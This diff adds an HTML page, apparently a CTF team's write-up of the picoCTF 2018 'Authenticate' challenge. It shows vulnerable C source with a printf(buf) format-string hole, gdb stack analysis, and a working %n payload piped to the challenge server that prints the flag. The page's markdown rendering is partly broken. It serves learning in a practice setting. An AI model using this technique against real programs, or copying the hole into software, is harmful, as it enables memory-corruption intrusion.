@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>  &middot; LiUhack - CTF team at LiU </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.51" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://liuhack.github.io/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+	
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://liuhack.github.io>LiUhack@LiUhack.se ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://liuhack.github.io">/home/LiUhack</a>
+				</li>
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="https://liuhack.github.io/writeups">~/writeups</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://liuhack.github.io/writeups/2018/picoctf/authenticate/readme/"></a></h1>
+            <span class="post-date">Jan 1, 0001 </span>
+            <div class="post-content">
+                
+
+<h1 id="authenticate-pwn">Authenticate - Pwn</h1>
+
+<p>On this challenge, we get this source code:</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+
+int authenticated = 0;
+
+int flag() {
+  char flag[48];
+  FILE *file;
+  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (file == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+  printf(&quot;%s&quot;, flag);
+  return 0;
+}
+
+void read_flag() {
+  if (!authenticated) {
+    printf(&quot;Sorry, you are not *authenticated*!\n&quot;);
+  }
+  else {
+    printf(&quot;Access Granted.\n&quot;);
+    flag();
+  }
+
+}
+
+int main(int argc, char **argv) {
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  char buf[64];
+  
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  
+  printf(&quot;Would you like to read the flag? (yes/no)\n&quot;);
+
+  fgets(buf, sizeof(buf), stdin);
+  
+  if (strstr(buf, &quot;no&quot;) != NULL) {
+    printf(&quot;Okay, Exiting...\n&quot;);
+    exit(1);
+  }
+  else if (strstr(buf, &quot;yes&quot;) == NULL) {
+    puts(&quot;Received Unknown Input:\n&quot;);
+    printf(buf);
+  }
+  
+  read_flag();
+
+}
+</code></pre>
+
+<p>Here we see that we need to get authenticated to equal 1 in order to get the flag. We then find a format string vulnerability on this line:</p>
+
+<pre><code class="language-printf(buf);```">
+First we fire up gdb and diassemble the read_flag function:
+</code></pre>
+
+<p>gdb-peda$ disas read_flag
+Dump of assembler code for function read_flag:
+   0x080486e4 &lt;+0&gt;:    push   ebp
+   0x080486e5 &lt;+1&gt;:    mov    ebp,esp
+   0x080486e7 &lt;+3&gt;:    sub    esp,0x8
+   0x080486ea &lt;+6&gt;:    mov    eax,ds:0x804a04c
+   0x080486ef &lt;+11&gt;:    test   eax,eax
+   0x080486f1 &lt;+13&gt;:    jne    0x8048705 <read_flag+33>
+   0x080486f3 &lt;+15&gt;:    sub    esp,0xc
+   0x080486f6 &lt;+18&gt;:    push   0x8048934
+   0x080486fb &lt;+23&gt;:    call   0x80484f0 <a href="mailto:puts@plt">puts@plt</a>
+   0x08048700 &lt;+28&gt;:    add    esp,0x10
+   0x08048703 &lt;+31&gt;:    jmp    0x804871a <read_flag+54>
+   0x08048705 &lt;+33&gt;:    sub    esp,0xc
+   0x08048708 &lt;+36&gt;:    push   0x8048958
+   0x0804870d &lt;+41&gt;:    call   0x80484f0 <a href="mailto:puts@plt">puts@plt</a>
+   0x08048712 &lt;+46&gt;:    add    esp,0x10
+   0x08048715 &lt;+49&gt;:    call   0x804865b <flag>
+   0x0804871a &lt;+54&gt;:    nop
+   0x0804871b &lt;+55&gt;:    leave<br />
+   0x0804871c &lt;+56&gt;:    ret<br />
+End of assembler dump.</p>
+
+<pre><code>
+Here we see this line:
+```0x080486ea &lt;+6&gt;:    mov    eax,ds:0x804a04c```
+
+This will move the authenticated variable into the register EAX, and ds stands for data segment. This instruction is hardcoded which means that authenticated variable will always be on this address, and this makes it easier for us.
+
+First I need to check where I can set breakpoint in main to be able to see how the stack looks after the call to the vulnerable function printf as I mentioned earlier.
+
+</code></pre>
+
+<p>&hellip;.
+0x080487e5 &lt;+200&gt;:  push   0x80489aa
+   0x080487ea &lt;+205&gt;:   call   0x80484f0 <a href="mailto:puts@plt">puts@plt</a>
+   0x080487ef &lt;+210&gt;:   add    esp,0x10
+   0x080487f2 &lt;+213&gt;:   sub    esp,0xc
+   0x080487f5 &lt;+216&gt;:   lea    eax,[ebp-0x4c]
+   0x080487f8 &lt;+219&gt;:   push   eax
+   0x080487f9 &lt;+220&gt;:   call   0x80484b0 <a href="mailto:printf@plt">printf@plt</a>
+   0x080487fe &lt;+225&gt;:   add    esp,0x10
+   0x08048801 &lt;+228&gt;:   call   0x80486e4 <read_flag>
+   0x08048806 &lt;+233&gt;:   mov    eax,0x0
+   0x0804880b &lt;+238&gt;:   mov    edx,DWORD PTR [ebp-0xc]
+&hellip;.</p>
+
+<pre><code>
+I set a breakpoint after the printf line here with:
+``` b * 0x080487fe```
+
+Then I run this:
+&gt;run &lt;&lt;&lt; $(python -c 'print &quot;\x4c\xa0\x04\x08%p%p%p%p%p&quot;')
+
+To start the program and %p prints what is on the stack. I then use ```x/xw $esp``` to see how the stack looks like:
+</code></pre>
+
+<p>gdb-peda$ x/xw $esp
+0xffffd280:    0xffffd2ac
+gdb-peda$
+0xffffd284:    0x080489a6
+gdb-peda$
+0xffffd288:    0xf7fa15c0
+gdb-peda$
+0xffffd28c:    0x0804875a
+gdb-peda$
+0xffffd290:    0x00000000
+gdb-peda$
+0xffffd294:    0x00ca0000
+gdb-peda$
+0xffffd298:    0x00000000
+gdb-peda$
+0xffffd29c:    0xffffd3a4
+gdb-peda$
+0xffffd2a0:    0x00000000
+gdb-peda$
+0xffffd2a4:    0x00000000
+gdb-peda$
+0xffffd2a8:    0x00000000
+gdb-peda$
+0xffffd2ac:    0x0804a04c</p>
+
+<pre><code>We see here that the address 0x0804a04c is on the 11th step, which means that when we run this:
+```python -c 'print &quot;\x4c\xa0\x04\x08%11$p&quot;' | ./auth ```
+Here, ```$``` says which place on the stack we should write/read from. From the output on the command above, we should get the address and that is what we get:
+</code></pre>
+
+<p>Would you like to read the flag? (yes/no)
+Received Unknown Input:</p>
+
+<p>L�0x804a04c
+Sorry, you are not <em>authenticated</em>!</p>
+
+<pre><code>
+Now we need to write something to the stack and we can use %n for that. So we change from %p to %n
+
+```python -c 'print &quot;\x4c\xa0\x04\x08%11$n&quot;' | nc 2018shell2.picoctf.com 26336```
+
+The %n prints out the length of what has been printed out from printf which is 4 in this case, so authenticated will contain the number 4 which works because authenticated will be true as long as it is not 0.
+
+If we run the command above, we get the flag: 
+</code></pre>
+
+<p>Would you like to read the flag? (yes/no)
+Received Unknown Input:</p>
+
+<p>Access Granted.
+picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91}
+````</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2019 LiUhack
+</p>
+</footer>
+
+    </body>
